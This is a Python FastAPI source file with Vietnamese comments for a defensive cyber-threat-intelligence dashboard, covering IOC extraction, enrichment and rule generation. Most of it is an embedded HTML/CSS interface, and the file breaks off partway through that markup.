# -*- coding: utf-8 -*-
"""
HỆ THỐNG AUTONOMOUS CTI AI AGENT — TERMINAL CLI (TMUX / BASH MAINFRAME EDITION)
Chạy tại: http://127.0.0.1:8765
Thiết kế:
- Phong cách Terminal CLI (Cyber-Industrial / ZSH-BASH Shell / TMUX Panes):
  + Phosphor Black (#0a0a0a), Terminal Neon Green (#33ff00), Amber Warning (#ffb000),
    Dimmed Green Border (#1f521f), Critical Error Red (#ff3333).
  + Monospace Supremacy: 100% JetBrains Mono & Fira Code trên mọi thành phần.
  + Góc vuông tuyệt đối 0px, viền cửa sổ 1px solid/dashed kiểu tmux panes (+--- WINDOW TITLE ---+),
    nút bấm đóng ngoặc vuông [ INITIATE ] với hiệu ứng đảo màu (Inverted Video) khi hover/active,
    ô nhập liệu kiểu shell prompt (root@cti-agent:~$), con trỏ nhấp nháy █ và lớp phủ CRT Scanlines.
"""

from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import json
from pathlib import Path
import re
import sqlite3
import sys
import threading
import time
from typing import Any, Dict, List, Optional

def _clean_refang_py(s: str) -> str:
    if not s:
        return ""
    res = s.replace("[.]", ".").replace("(.)", ".").replace("[:]", ":")
    res = re.sub(r"[\[\]\(\)\{\}]", "", res)
    return res.strip()

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import uvicorn

REPO_ROOT = Path(__file__).resolve().parents[1] / "ai-devsecops-agent"
SANDBOX_DIR = Path(__file__).resolve().parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))
if str(SANDBOX_DIR) not in sys.path:
    sys.path.insert(0, str(SANDBOX_DIR))

from shared.schemas import EnrichedIOC, ExtractedIOC
from src.security.enrichment_service import enrich_ioc, filter_high_risk_iocs
from src.security.stix_converter import export_stix_package
from lam_automation_crawler import (
    add_custom_article_from_url_or_text,
    crawl_all_sources_and_archive,
    crawl_year_to_date_archive,
    delete_archived_article,
    get_archived_articles,
    get_database_overview_stats,
    save_ai_analysis_run_to_db,
    save_enriched_iocs_to_db,
    toggle_article_historical_status,
    update_article_analysis_status,
    _count_real_iocs,
)
from openclaw_firewall_bridge import (
    LocalFirewallBridge,
    MultiLayerDefenseSynthesizer,
    build_d3fend_recommendations,
    build_master_defense_matrix_from_db,
)
from phuc_core_ai_agent import (
    AIAgentSecurityGuard,
    MultiProviderLLMBrain,
    OpenClawAgentGateway,
    tool6_extract_iocs_hybrid,
    tool7_map_mitre_attack,
    tool8_generate_defensive_rules,
)
from live_defense_orchestrator import live_orchestrator
from system_hardware_detector import detect_hardware_profile, get_adaptive_system_profile

CURRENT_HARDWARE = detect_hardware_profile()

app = FastAPI(title="Tự động hóa quy trình CTI và Sinh quy tắc phòng thủ ứng dụng AI agent")


class TestWafRequest(BaseModel):
    attack_type: str = "sqli"


class AddArticleRequest(BaseModel):
    url: str = ""
    title: str = ""
    content: str = ""


class ArticleManageRequest(BaseModel):
    article_id: str


class UpdateArticleStatusRequest(BaseModel):
    article_id: str
    status: str = "completed"
    processing_time_sec: float = 0.0


class Step2Request(BaseModel):
    text: str
    model_name: str = "khang-qwen3"


class Step3Request(BaseModel):
    text: str
    iocs: List[Dict[str, Any]]
    model_name: str = "khang-qwen3"


class Step4GenerateRequest(BaseModel):
    title: str
    text: str
    malicious_iocs: List[Dict[str, Any]]
    model_name: str = "khang-qwen3"


class FirewallSyncRequest(BaseModel):
    action: str = "apply"
    malicious_iocs: List[Dict[str, Any]] = []


class ChatAgentRequest(BaseModel):
    message: str
    model_name: str = "khang-qwen3"
    history: List[Dict[str, str]] = []


class DaemonConfigRequest(BaseModel):
    auto_scan_enabled: Optional[bool] = None
    scan_interval_sec: Optional[int] = None
    auto_queue_enabled: Optional[bool] = None


class SuricataTestRequest(BaseModel):
    flow_type: str = "c2_flow"


class SysmonTestRequest(BaseModel):
    event_type: str = "web_shell_spawn"


class YaraScanRequest(BaseModel):
    target_hash: str = ""


HTML_PAGE = r"""<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AUTONOMOUS CTI — LOCAL AI AGENT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-page: #f8fafc;
      --bg-card: #ffffff;
      --bg-subtle: #f1f5f9;
      --bg-input: #ffffff;
      --border-main: #e2e8f0;
      --border-dark: #cbd5e1;
      --border-focus: #3b82f6;
      --text-main: #0f172a;
      --text-muted: #64748b;
      --primary: #2563eb;
      --primary-hover: #1d4ed8;
      --primary-subtle: #eff6ff;
      --amber: #b45309;
      --amber-bg: #fffbeb;
      --amber-border: #fcd34d;
      --danger: #b91c1c;
      --danger-bg: #fef2f2;
      --danger-border: #fca5a5;
      --safe: #15803d;
      --safe-bg: #f0fdf4;
      --safe-border: #86efac;

      /* Backward compatibility */
      --green-main: #2563eb;
      --green-border: #cbd5e1;
      --green-dim: #e2e8f0;
      --bg-dark: #f8fafc;
      --bg-box: #ffffff;
      --gold: #2563eb;
      --gold-light: #3b82f6;
      --pewter: #64748b;
      --fg-secondary: #2563eb;
      --fg-primary: #0f172a;
      --fg-dim: #64748b;
      --fg-error: #b91c1c;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-page);
      color: var(--text-main);
      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      font-size: 14px;
      line-height: 1.5;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }

    code, pre, .mono {
      font-family: 'JetBrains Mono', Consolas, monospace;
    }

    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: var(--bg-page); }
    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }

    /* ================= TOP NAVBAR ================= */
    .TopNav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 28px;
      border-bottom: 1px solid var(--border-main);
      background: #ffffff;
      position: sticky;
      top: 0;
      z-index: 100;
      flex-wrap: wrap;
      gap: 14px;
      box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.04);
    }

    .NavBrand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 17px;
      font-weight: 700;
      color: var(--text-main);
      letter-spacing: -0.01em;
    }
    .NavBrandTag {
      font-size: 11px;
      font-weight: 600;
      padding: 2px 8px;
      background: var(--primary-subtle);
      color: var(--primary);
      border: 1px solid #bfdbfe;
      border-radius: 4px;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }

    .NavLinks {
      display: flex;
      align-items: center;
      gap: 6px;
      flex-wrap: wrap;
    }

    .NavLink {
      background: transparent;
      color: var(--text-muted);
      border: 1px solid transparent;
      padding: 6px 14px;
      font-size: 13.5px;
      font-weight: 500;
      cursor: pointer;
      border-radius: 6px;
      transition: all 0.15s ease;
    }
    .NavLink:hover {
      color: var(--text-main);
      background: var(--bg-subtle);
    }
    .NavLink.active {
      color: var(--primary);
      background: var(--primary-subtle);
      border: 1px solid #bfdbfe;
      font-weight: 600;
    }

    .NavRight {
      display: flex;
      align-items: center;
      gap: 10px;
      flex-wrap: wrap;
    }

    .CleanSelect, .CleanInput {
      background: var(--bg-input);
      color: var(--text-main);
      border: 1px solid var(--border-dark);
      padding: 7px 12px;
      font-size: 13.5px;
      border-radius: 6px;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }
    .CleanSelect:focus, .CleanInput:focus {
      border-color: var(--border-focus);
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
    }

    .CleanBtn {
      background: #ffffff;
      color: var(--text-main);
      border: 1px solid var(--border-dark);
      padding: 7px 16px;
      font-size: 13px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.15s ease;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
    }
    .CleanBtn:hover {
      background: var(--bg-subtle);
      border-color: #94a3b8;
    }
    .CleanBtn.active {
      background: var(--primary);
      color: #ffffff;
      border-color: var(--primary);
    }
    .CleanBtn.btn-primary {
      background: var(--primary);
      color: #ffffff;
      border-color: var(--primary);
    }
    .CleanBtn.btn-primary:hover {
      background: var(--primary-hover);
    }
    .CleanBtn:disabled {
      opacity: 0.55;
      cursor: wait;
    }

    .BtnMiniProof {
      background: #ffffff;
      color: var(--text-muted);
      border: 1px solid var(--border-main);
      padding: 2px 9px;
      font-size: 11.5px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 4px;
      transition: all 0.15s ease;
    }
    .BtnMiniProof:hover {
      border-color: var(--primary);
      color: var(--primary);
      background: var(--primary-subtle);
    }

    /* ================= MAIN WRAPPER & STATUS BAR ================= */
    .MainWrap {
      max-width: 1220px;
      margin: 20px auto 48px;
      padding: 0 20px;
    }

    .StatusStrip {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      margin-bottom: 22px;
      border: 1px solid var(--border-main);
      background: #ffffff;
      border-radius: 8px;
      font-size: 13px;
      color: var(--text-muted);
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
      flex-wrap: wrap;
      gap: 10px;
    }

    /* ================= CARD CONTAINER ================= */
    .CyberBox {
      position: relative;
      background: #ffffff;
      border: 1px solid var(--border-main);
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.03);
      padding: 24px 22px 20px;
      margin-bottom: 26px;
    }

    .BoxLegend {
      position: absolute;
      top: -12px;
      left: 18px;
      background: #ffffff;
      padding: 0 10px;
      color: var(--text-main);
      font-size: 13.5px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      border: 1px solid var(--border-main);
      border-radius: 4px;
    }

    .FieldLabel {
      display: block;
      font-size: 11.5px;
      font-weight: 600;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.04em;
      margin-bottom: 6px;
    }

    /* ================= SECTION 1: 2-COLUMN NEWS & READER ================= */
    .ToolbarRow {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      margin-bottom: 14px;
      flex-wrap: wrap;
    }

    .SplitWorkspace {
      display: grid;
      grid-template-columns: 4.5fr 7.5fr;
      gap: 16px;
    }
    @media (max-width: 920px) {
      .SplitWorkspace { grid-template-columns: 1fr; }
    }

    .FeedColumn {
      background: var(--bg-subtle);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      height: 400px;
      overflow-y: auto;
      padding: 8px;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .FeedItem {
      padding: 11px 13px;
      border: 1px solid var(--border-main);
      background: #ffffff;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.15s ease;
    }
    .FeedItem:hover {
      border-color: #94a3b8;
    }
    .FeedItem.selected {
      border-color: var(--primary);
      background: #ffffff;
      box-shadow: inset 3px 0 0 var(--primary), 0 1px 3px rgba(37, 99, 235, 0.12);
    }
    .FeedMeta {
      display: flex;
      justify-content: space-between;
      font-size: 11.5px;
      color: var(--text-muted);
      margin-bottom: 4px;
    }
    .FeedSource {
      color: var(--primary);
      font-weight: 600;
    }
    .FeedTitle {
      font-size: 13px;
      font-weight: 500;
      color: var(--text-main);
      line-height: 1.45;
    }
    .FeedFootMeta {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 7px;
      font-size: 11px;
      color: var(--text-muted);
      border-top: 1px dashed var(--border-main);
      padding-top: 5px;
    }
    .BadgePending {
      background: #fef3c7;
      color: #b45309;
      border: 1px solid #fde68a;
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 10.5px;
      font-weight: 600;
      letter-spacing: 0.02em;
    }
    .BadgeProcessing {
      background: #dbeafe;
      color: #1d4ed8;
      border: 1px solid #93c5fd;
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 10.5px;
      font-weight: 600;
      letter-spacing: 0.02em;
      animation: pulseAnim 1.5s infinite;
    }
    .BadgeCompleted {
      background: #dcfce7;
      color: #15803d;
      border: 1px solid #86efac;
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 10.5px;
      font-weight: 600;
      letter-spacing: 0.02em;
    }
    @keyframes pulseAnim {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.7; transform: scale(0.98); }
    }
    .LiveTickerBar {
      background: #ffffff;
      border: 1px solid var(--border-main);
      border-left: 4px solid var(--primary);
      border-radius: 6px;
      padding: 9px 14px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
    }
    .LivePulseDot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #16a34a;
      box-shadow: 0 0 0 3px rgba(22, 163, 74, 0.2);
      display: inline-block;
      animation: dotPulse 2s infinite;
      flex-shrink: 0;
    }
    @keyframes dotPulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.25); opacity: 0.65; }
    }

    .ReaderColumn {
      background: #ffffff;
      border: 1px solid var(--border-main);
      border-radius: 6px;
      height: 400px;
      display: flex;
      flex-direction: column;
    }
    .ReaderHeader {
      padding: 9px 14px;
      border-bottom: 1px solid var(--border-main);
      background: var(--bg-subtle);
      border-top-left-radius: 6px;
      border-top-right-radius: 6px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      font-weight: 600;
      color: var(--text-muted);
      flex-wrap: wrap;
      gap: 8px;
    }
    .ReaderBody {
      padding: 14px 16px;
      overflow-y: auto;
      font-size: 13.5px;
      line-height: 1.7;
      color: var(--text-main);
      flex: 1;
    }

    .HlSentence {
      margin: 6px 0;
      padding: 8px 12px;
      background: var(--bg-subtle);
      border-left: 3px solid var(--primary);
      border-radius: 0 4px 4px 0;
    }

    .HlIp1, .HlIp2, .HlCve, .HlHash {
      padding: 1px 7px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      font-weight: 600;
      display: inline-block;
      margin: 1px 2px;
      border-radius: 4px;
    }
    .HlIp1 {
      background: var(--danger-bg);
      color: var(--danger);
      border: 1px solid var(--danger-border);
    }
    .HlIp2 {
      background: var(--safe-bg);
      color: var(--safe);
      border: 1px solid var(--safe-border);
    }
    .HlCve {
      background: var(--amber-bg);
      color: var(--amber);
      border: 1px solid var(--amber-border);
    }
    .HlHash {
      background: #f5f3ff;
      color: #7c3aed;
      border: 1px solid #ddd6fe;
    }

    .BtnIocJump {
      font-size: 11px;
      font-weight: 600;
      padding: 2px 7px;
      border: 1px solid #bfdbfe;
      background: #eff6ff;
      color: #0284c7;
      border-radius: 4px;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 3px;
      transition: all 0.15s ease;
      white-space: nowrap;
      margin-top: 3px;
    }
    .BtnIocJump:hover {
      background: #0284c7;
      color: #ffffff;
      border-color: #0284c7;
    }

    @keyframes flashPulse {
      0% { box-shadow: 0 0 0 0 rgba(2, 132, 199, 0.7); background: #fef08a !important; color: #854d0e !important; }
      50% { box-shadow: 0 0 0 8px rgba(2, 132, 199, 0); background: #fde047 !important; color: #713f12 !important; }
      100% { box-shadow: 0 0 0 0 rgba(2, 132, 199, 0); background: #fef9c3 !important; }
    }
    .flash-focus {
      animation: flashPulse 2s ease-in-out;
      outline: 2px solid #0284c7 !important;
      border-radius: 4px;
    }

    /* ================= SECTION 2: AI BRIEF & SCORE TABLE ================= */
    .AiBriefGrid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 14px;
      margin-bottom: 16px;
    }
    @media (max-width: 860px) {
      .AiBriefGrid { grid-template-columns: 1fr; }
    }

    .AiBriefBox {
      background: var(--bg-subtle);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      padding: 12px 14px;
      font-size: 13px;
      color: var(--text-main);
      max-height: 130px;
      overflow-y: auto;
      white-space: pre-wrap;
      line-height: 1.55;
    }

    .TableWrap {
      max-height: 380px;
      overflow-y: auto;
      border: 1px solid var(--border-main);
      border-radius: 6px;
      background: #ffffff;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }
    th {
      position: sticky;
      top: 0;
      background: #f8fafc;
      color: var(--text-muted);
      font-size: 11.5px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      padding: 10px 12px;
      text-align: left;
      border-bottom: 1px solid var(--border-main);
      z-index: 5;
    }
    td {
      padding: 9px 12px;
      border-bottom: 1px solid var(--border-main);
      vertical-align: middle;
      color: var(--text-main);
    }
    tr:hover td {
      background: #f8fafc;
    }

    .StatusBlock {
      display: inline-block;
      padding: 2px 8px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--danger-border);
      color: var(--danger);
      background: var(--danger-bg);
      border-radius: 4px;
    }
    .StatusSafe {
      display: inline-block;
      padding: 2px 8px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--safe-border);
      color: var(--safe);
      background: var(--safe-bg);
      border-radius: 4px;
    }

    /* ================= SECTION 3: DEFENSE TABS ================= */
    .DecoTabs {
      display: flex;
      gap: 6px;
      margin-bottom: 14px;
      flex-wrap: wrap;
    }
    .TabPanel { display: none; }
    .TabPanel.active { display: block; }

    pre {
      background: #f8fafc;
      color: var(--text-main);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      padding: 14px 16px;
      font-size: 12.5px;
      line-height: 1.6;
      max-height: 340px;
      overflow: auto;
      white-space: pre-wrap;
    }

    /* ================= HISTORY & KNOWLEDGE BASE ================= */
    .HistoryStatsGrid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 12px;
      margin-bottom: 16px;
    }
    @media (max-width: 960px) {
      .HistoryStatsGrid { grid-template-columns: repeat(2, 1fr); }
    }
    .HistoryStatCard {
      background: var(--bg-subtle);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      padding: 12px 14px;
    }
    .HistoryStatLabel {
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      color: var(--text-muted);
      margin-bottom: 4px;
    }
    .HistoryStatValue {
      font-size: 17px;
      font-weight: 700;
      color: var(--text-main);
    }
    .HistoryStatSub {
      font-size: 11.5px;
      color: var(--text-muted);
      margin-top: 2px;
    }
    .BadgeOld {
      display: inline-block;
      padding: 2px 7px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--amber-border);
      color: var(--amber);
      background: var(--amber-bg);
      border-radius: 4px;
      cursor: pointer;
    }
    .BadgeNew {
      display: inline-block;
      padding: 2px 7px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--safe-border);
      color: var(--safe);
      background: var(--safe-bg);
      border-radius: 4px;
      cursor: pointer;
    }
    .IocChip {
      display: inline-block;
      padding: 1px 6px;
      margin: 2px 3px 2px 0;
      font-size: 11px;
      font-family: 'JetBrains Mono', monospace;
      border-radius: 3px;
      border: 1px solid var(--border-dark);
      background: #ffffff;
      color: var(--text-main);
    }
    .IocChip.ip { border-color: var(--danger-border); color: var(--danger); background: var(--danger-bg); }
    .IocChip.ip-internal { border-color: #cbd5e1; color: #475569; background: #f8fafc; }
    .IocChip.ip-safe { border-color: #a7f3d0; color: #065f46; background: #ecfdf5; }
    .IocChip.cve { border-color: var(--amber-border); color: var(--amber); background: var(--amber-bg); }
    .IocChip.dom { border-color: #bfdbfe; color: var(--primary); background: var(--primary-subtle); }
    .IocChip.hash { border-color: #d8b4fe; color: #7e22ce; background: #faf5ff; }

    .UnifiedScopeBanner {
      padding: 12px 16px;
      margin-bottom: 16px;
      border-radius: 6px;
      border: 1px solid #bfdbfe;
      background: #eff6ff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
      box-shadow: 0 1px 3px rgba(37, 99, 235, 0.08);
    }
    .UnifiedScopeBanner.master {
      border-color: #cbd5e1;
      background: #f8fafc;
    }
    .ScopeTag {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      padding: 3px 8px;
      border-radius: 4px;
      font-family: var(--font-mono);
      display: inline-block;
    }
    .ScopeTag.single {
      background: #2563eb;
      color: #ffffff;
    }
    .ScopeTag.master {
      background: #475569;
      color: #ffffff;
    }
    .IocTypeFilterBar {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      margin-bottom: 12px;
    }
    .IocTypeFilterBtn {
      background: #ffffff;
      color: var(--text-main);
      border: 1px solid var(--border-dark);
      padding: 5px 12px;
      font-size: 12.5px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.15s ease;
      display: inline-flex;
      align-items: center;
      gap: 4px;
    }
    .IocTypeFilterBtn:hover {
      background: var(--bg-subtle);
      border-color: #94a3b8;
    }
    .IocTypeFilterBtn.active {
      background: var(--primary);
      color: #ffffff;
      border-color: var(--primary);
    }
  </style>
</head>
<body>

  <!-- TOP NAVBAR -->
  <nav class="TopNav">
    <div class="NavBrand">
      <span>CTI DEFENSE AGENT</span>
      <span class="NavBrandTag">AUTONOMOUS</span>
    </div>

    <div class="NavLinks">
      <button class="NavLink active" style="background:#2563eb; color:#ffffff; font-weight:700; border:1px solid #1d4ed8;" onclick="switchView('sec-wizard', this)">🚀 5 Bước Tự Hành (Wizard)</button>
      <button class="NavLink" onclick="switchView('all', this)">Tất Cả</button>
      <button class="NavLink" onclick="switchView('sec-feed', this)">1. Nguồn Báo</button>
      <button class="NavLink" onclick="switchView('sec-history', this)">Lịch Sử Đã Học (<span id="navHistoryCount">0</span>)</button>
      <button class="NavLink" onclick="switchView('sec-score', this)">2. Bảng Điểm IOC</button>
      <button class="NavLink" onclick="switchView('sec-defense', this)">3. Kho Kỹ Năng Tác Tử (Agentic Skills)</button>
      <button class="NavLink" onclick="switchView('sec-chat', this)">Chat AI Agent</button>
      <button class="NavLink" onclick="switchView('sec-add', this)">+ Thêm Báo Mới</button>
    </div>

    <div class="NavRight">
      <select id="aiModelSelect" class="CleanSelect" onchange="onAiModelChange()">
        <option value="auto" selected>Đang dò tìm Model &amp; GPU cục bộ...</option>
      </select>
      <button class="CleanBtn btn-primary" id="btnRunAll" onclick="runPipeline()">
        Chạy Phân Tích
      </button>
      <button class="CleanBtn" style="border-color:#fca5a5; color:#b91c1c;" onclick="shutdownSystem()" title="Dừng hệ thống và giải phóng tài nguyên">
        Tắt Hệ Thống
      </button>
    </div>
  </nav>

  <div class="MainWrap">

    <!-- THANH TRẠNG THÁI -->
    <div class="StatusStrip">
      <div>
        <b style="color:var(--primary);" id="localModelBadge">TỰ ĐỘNG NHẬN DIỆN PHẦN CỨNG...</b>
        <span style="margin:0 8px;">&bull;</span>
        <span id="statusText">Sẵn sàng phân tích.</span>
        <span id="liveTelemetryLine" style="display:none;"></span>
      </div>
      <div style="display:flex; align-items:center; gap:12px;">
        <label style="font-size:12.5px; cursor:pointer; display:flex; align-items:center; gap:6px;">
          <input type="checkbox" id="autoQueueToggle" checked onchange="toggleAutoQueueWorker()" />
          Tự động xử lý tuần tự (<span id="queueWorkerStatus" style="color:var(--primary); font-weight:600;">Bật</span>)
        </label>
        <span style="color:var(--border-main);">&bull;</span>
        <label style="font-size:12.5px; cursor:pointer; display:flex; align-items:center; gap:6px;">
          <input type="checkbox" id="autoScanToggle" checked onchange="onAutoScanToggleChange(this.checked)" />
          Tự động quét ngầm:
        </label>
        <select class="CleanSelect" id="scanDelayInput" onchange="onScanDelayChange(this.value)" style="padding:2px 8px; font-size:12px; height:26px; border-color:var(--border-main);">
          <option value="60">Mỗi 1 phút (60s)</option>
          <option value="120" selected>Mỗi 2 phút (120s)</option>
          <option value="300">Mỗi 5 phút (300s)</option>
          <option value="600">Mỗi 10 phút (600s)</option>
        </select>
        <span class="mono" style="font-size:12px; color:var(--primary); font-weight:600;" id="countdownText">120s</span>
        <span class="mono" style="color:var(--primary); font-weight:600;" id="progressPercentText">100%</span>
      </div>
      <!-- Giữ ID ẩn cho tương thích JS -->
      <div style="display:none;">
        <span id="st1"></span><span id="st1Meta"></span>
        <span id="st2"></span><span id="st2Meta"></span>
        <span id="st3"></span><span id="st3Meta"></span>
        <span id="st4"></span><span id="st4Meta"></span>
      </div>
    </div>

    <!-- KHUNG CHAT TRỰC TIẾP VỚI LOCAL AI AGENT -->
    <section class="CyberBox" id="sec-chat" style="display:none; max-width:820px; margin:0 auto 26px;">
      <div class="BoxLegend" id="chatBoxLegend">TRỢ LÝ AI AGENT (ĐANG TẢI PHẦN CỨNG)</div>

      <div id="chatLogBox" style="background:var(--bg-subtle); border:1px solid var(--border-main); border-radius:6px; height:320px; overflow-y:auto; padding:14px 16px; margin-bottom:14px; display:flex; flex-direction:column; gap:12px; font-size:13.5px;">
        <div style="padding:10px 14px; border-left:3px solid var(--primary); background:#ffffff; border-radius:0 6px 6px 0; border:1px solid var(--border-main); border-left:3px solid var(--primary);">
          <b style="color:var(--primary);">OpenClaw-AI:</b><br/>
          Hệ thống AI Agent hỗ trợ tiếng Việt có dấu Unikey. Nhập chỉ số IOC (IP, Domain, CVE) vào khung bên dưới để tự động tra cứu dữ liệu từ 5 nguồn tình báo (OTX, Abuse.ch/VT, AbuseIPDB, Shodan, GreyNoise).
        </div>
      </div>

      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
        <label class="FieldLabel" style="margin:0;">NHẬP CÂU HỎI HOẶC CHỈ SỐ IOC CẦN ĐIỀU TRA</label>
        <div style="display:flex; gap:6px; flex-wrap:wrap;">
          <button type="button" class="BtnMiniProof" onclick="quickFillChat('Kiểm tra mức độ nguy hiểm của IP 43.134.165.205')">Tra cứu IP 43.134.165.205</button>
          <button type="button" class="BtnMiniProof" onclick="quickFillChat('Liệt kê các lỗ hổng CVE nguy hiểm nhất trong kho bài báo')">Top CVE nguy hiểm</button>
          <button type="button" class="BtnMiniProof" onclick="quickFillChat('Đề xuất chính sách phòng thủ WAF và Suricata cho lỗ hổng RCE')">Quy tắc phòng thủ RCE</button>
        </div>
      </div>
      <div style="display:flex; gap:10px;">
        <input
          type="text"
          id="webChatInput"
          class="CleanInput"
          style="flex:1;"
          placeholder="VD: Kiểm tra mức độ nguy hiểm của IP 43.134.165.205 và đề xuất chính sách phòng thủ..."
          onkeydown="if(event.key==='Enter') sendWebChatMessage()"
        />
        <button class="CleanBtn btn-primary" id="btnSendChat" onclick="sendWebChatMessage()">
          Gửi Câu Hỏi
        </button>
      </div>
    </section>

    <!-- KHUNG THÊM BÁO MỚI -->
    <section class="CyberBox" id="sec-add" style="display:none; max-width:700px; margin:0 auto 26px;">
      <div class="BoxLegend">THÊM BÀI BÁO MỚI</div>

      <div style="margin-bottom:14px;">
        <label class="FieldLabel">URL BÀI BÁO CẦN THU THẬP NGUYÊN BẢN</label>
        <div style="display:flex; gap:10px;">
          <input
            type="text"
            id="newArticleUrlInput"
            class="CleanInput"
            style="flex:1;"
            placeholder="https://thehackernews.com/... hoặc https://securelist.com/..."
          />
          <button class="CleanBtn btn-primary" id="btnAddUrl" onclick="addArticleFromUrl()">
            Cào Dữ Liệu URL
          </button>
        </div>
      </div>

      <div id="manualArticleDrawer" style="margin-top:16px; padding-top:16px; border-top:1px solid var(--border-main);">
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:10px;">
          <div>
            <label class="FieldLabel">TIÊU ĐỀ BÀI BÁO (TÙY CHỌN)</label>
            <input type="text" id="manualTitleInput" class="CleanInput" style="width:100%;" placeholder="Nhập tiêu đề..." />
          </div>
          <div>
            <label class="FieldLabel">WEBSITE NGUỒN</label>
            <input type="text" id="manualSourceUrlInput" class="CleanInput" style="width:100%;" placeholder="https://thehackernews.com" />
          </div>
        </div>
        <label class="FieldLabel">NỘI DUNG VĂN BẢN</label>
        <textarea
          id="manualContentInput"
          class="CleanInput"
          style="width:100%; min-height:110px; margin-bottom:12px;"
          placeholder="Dán nội dung báo cáo kỹ thuật vào đây..."
        ></textarea>
        <button class="CleanBtn btn-primary" style="width:100%;" onclick="addManualArticle()">
          Lưu và Phân Tích
        </button>
      </div>
    </section>

    <!-- MỤC 1: BÀI BÁO & HIGHLIGHT IOC -->
    
    <!-- ============================================================== -->
    <!-- MỤC 0: WIZARD QUY TRÌNH PHÒNG THỦ TỰ HÀNH 5 BƯỚC              -->
    <!-- ============================================================== -->
    <section class="CyberBox" id="sec-wizard" style="margin-bottom:24px; border:2px solid #3b82f6; background:#ffffff; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);">
      <div class="BoxLegend" style="background:#2563eb; color:#ffffff; font-weight:700; padding:4px 14px; border-radius:4px; font-size:12px; letter-spacing:0.04em;">
        🚀 WIZARD QUY TRÌNH PHÒNG THỦ TÁC TỬ TỰ HÀNH (5 BƯỚC KHÉP KÍN)
      </div>

      <!-- Stepper Nav Bar -->
      <div style="display:flex; justify-content:space-between; align-items:center; margin:16px 0 24px 0; background:#f8fafc; padding:12px 18px; border-radius:8px; border:1px solid #e2e8f0; flex-wrap:wrap; gap:8px;">
        <div id="stepBadge1" class="WizardStepBadge active" style="font-weight:700; padding:6px 14px; border-radius:20px; font-size:12px; background:#2563eb; color:#ffffff;">
          1. Quét Dự Án
        </div>
        <span style="color:#94a3b8; font-weight:bold;">➔</span>
